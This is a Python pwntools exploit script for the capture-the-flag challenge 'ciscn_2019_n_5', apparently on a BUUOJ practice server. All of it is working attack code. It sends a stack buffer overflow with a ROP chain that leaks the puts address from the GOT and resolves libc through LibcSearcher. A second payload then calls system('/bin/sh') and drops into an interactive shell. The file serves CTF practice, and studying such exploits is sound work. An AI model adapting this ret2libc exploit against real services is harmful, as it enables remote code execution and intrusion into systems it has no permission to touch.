#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './ciscn_2019_n_5'
elf = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 27624)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']

# ROPgadget --binary ciscn_2019_n_5 --only 'pop|ret'
pop_rdi = 0x0000000000400713
ret = 0x00000000004004c9

def do_main(payload):
    p.sendline('kke')
    p.recvuntil(b'What do you want to say to me?\n')
    p.sendline(payload)

# Leak puts()
do_main(b'a' * (0x20+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))

puts_addr = u64(p.recv().ljust(8, b'\x00'))
log.info(f'puts={hex(puts_addr)}')

searcher = LibcSearcher(func='puts', address=puts_addr)
libc_base = puts_addr - searcher.dump('puts')
libc_system = libc_base + searcher.dump('system')
bin_sh = libc_base + searcher.dump('str_bin_sh')

log.info(f'base={hex(libc_base)}; system={hex(libc_system)}; /bin/sh={hex(bin_sh)}')

do_main(b'a' * (0x20+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(libc_system) + p64(main))

p.interactive()
